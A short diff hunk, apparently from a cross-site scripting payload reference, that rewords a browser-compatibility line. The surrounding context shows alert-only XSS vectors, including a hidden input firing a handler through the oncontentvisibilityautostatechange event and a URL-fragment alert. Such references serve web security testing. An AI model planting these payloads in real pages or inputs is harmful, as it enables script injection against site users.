@@ -252,7 +252,7 @@ e.g: 14.rs/#alert(document.domain)
 Use CTRL+SHIFT+X to trigger the onclick event
 ```
 
-in newer browsers : firefox-130/chrome-108
+Works in all Newer chromium based browser since chrome-108 and only in firefox-130
 
 ```javascript
 <input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
